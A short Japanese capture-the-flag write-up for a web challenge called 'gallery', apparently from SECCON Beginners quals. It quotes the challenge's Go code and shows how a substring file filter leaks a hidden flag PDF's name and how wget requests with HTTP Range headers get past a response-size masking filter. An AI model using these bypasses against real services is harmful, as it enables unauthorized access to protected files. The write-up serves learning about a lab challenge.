# gallery

`file_extension=hoge`でやると拡張子がhogeのファイルが取得できそう

ソースコードを見ると

```go
func getImageList(fileExtension string) ([]string, error) {
	files, err := os.ReadDir("static")
	if err != nil {
		return nil, err
	}

	res := make([]string, 0, len(files))
	for _, file := range files {
		if !strings.Contains(file.Name(), fileExtension) {
			continue
		}
		res = append(res, file.Name())
	}

	return res, nil
}
```

strings.Containsでクエリの文字が含まれているかどうかを判断しているので実際には拡張子ではなく、ファイル名でも一致していれば取得できることがわかる

```go
fileExtension = strings.ReplaceAll(fileExtension, "flag", "")
```

flagに関するものを取得したいがflagは無効化されてしまうことがわかる

しかし、前述したように一文字でも入っていればファイル一覧が取得できるのでfだけで検索をかけると`flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf`というファイルが確認できる

これについて確認したいが

```go
func (w *MyResponseWriter) Write(data []byte) (int, error) {
	filledVal := []byte("?")

	length := len(data)
	if length > w.lengthLimit {
		w.ResponseWriter.Write(bytes.Repeat(filledVal, length))
		return length, nil
	}

	w.ResponseWriter.Write(data[:length])
	return length, nil
}

func middleware() func(http.Handler) http.Handler {
	return func(h http.Handler) http.Handler {
		return http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
			h.ServeHTTP(&MyResponseWriter{
				ResponseWriter: rw,
				lengthLimit:    10240, // SUPER SECURE THRESHOLD
			}, r)
		})
	}
}
```

10240byteを超えると、ファイルサイズ分の?が返ってくるようになっており、flagを取得できない


以下、チームメイトがsolve

flagのpdfの?の数を数えると16085であることがわかる

そこで、`Range`headerを用いて半分ずつ取得し、結合する


```
$ wget --header='Range: bytes=0-8085' https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf
$ wget --header='Range: bytes=8086-16085' https://gallery.quals.beginners.seccon.jp/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf
$ cat flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf.1 > flag.pdf
```

flagがpdfに記載してある
